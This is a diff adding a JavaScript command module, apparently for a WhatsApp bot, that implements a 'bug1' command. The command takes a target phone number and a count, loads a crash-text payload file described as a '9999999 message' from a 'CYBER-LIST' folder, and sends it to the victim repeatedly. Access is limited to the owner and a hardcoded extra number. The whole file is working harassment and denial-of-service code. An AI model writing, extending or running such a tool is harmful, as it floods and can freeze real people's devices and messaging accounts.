@@ -1,0 +1,66 @@
+import config from '../../config.cjs';
+import fs from 'fs';
+
+const bug1 = async (m, gss) => {
+  try {
+    const botNumber = await gss.decodeJid(gss.user.id);
+    // Add the specified number (94753574803) to the allowed list
+    const allowedNumbers = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', '94759096416@s.whatsapp.net'];
+    const isCreator = allowedNumbers.includes(m.sender);
+    const prefixMatch = m.body.match(/^[\\/!#.]/);
+    const prefix = prefixMatch ? prefixMatch[0] : '/';
+    const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
+    const text = m.body.slice(prefix.length + cmd.length).trim();
+
+    const validCommands = ['bug1'];
+
+    if (!validCommands.includes(cmd)) return;
+
+    // Check if the sender is either the bot, the owner, or the specific allowed number (94753574803)
+    if (!isCreator) return m.reply("📛 *THIS IS AN OWNER COMMAND*");
+
+    // Extracting the phone number and count from the command
+    const [number, count] = text.split(' ');
+    const phoneNumber = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+    const messageCount = parseInt(count, 10);
+
+    // Validate phone number and count
+    if (!phoneNumber || isNaN(messageCount) || messageCount <= 0) {
+      return m.reply("⚠️ *Please provide a valid phone number and a positive count* 📍");
+    }
+
+    // Path to the file to send the message
+    const filePath = '../cloud/CYBER-LIST/xeontext17.js';
+
+    // Check if the file exists and read the content (9999999 message)
+    if (fs.existsSync(filePath)) {
+      const message = fs.readFileSync(filePath, 'utf-8');
+      if (message) {
+        // Sending the message multiple times
+        for (let i = 0; i < messageCount; i++) {
+          await gss.sendMessage(phoneNumber, { text: message });
+        }
+        
+        // Adding a react emoji after the message is sent
+        await gss.sendMessage(m.chat, {
+          react: {
+            text: '✅', // Reaction emoji
+            key: m.key, // Reacting to the original message
+          },
+        });
+
+        // Reply with a styled message
+        m.reply(`🎉 *Message sent ${messageCount} times to ${phoneNumber.split('@')[0]}* 🚀 *RCD MD BUG* 🙂📍`);
+      } else {
+        m.reply("❌ *ERROR TRY AGAIN* 😒👍");
+      }
+    } else {
+      m.reply("❌ *File not found.*");
+    }
+  } catch (error) {
+    console.error('Error:', error);
+    m.reply("⚠️ *An error occurred while processing the command.*");
+  }
+};
+
+export default bug1;
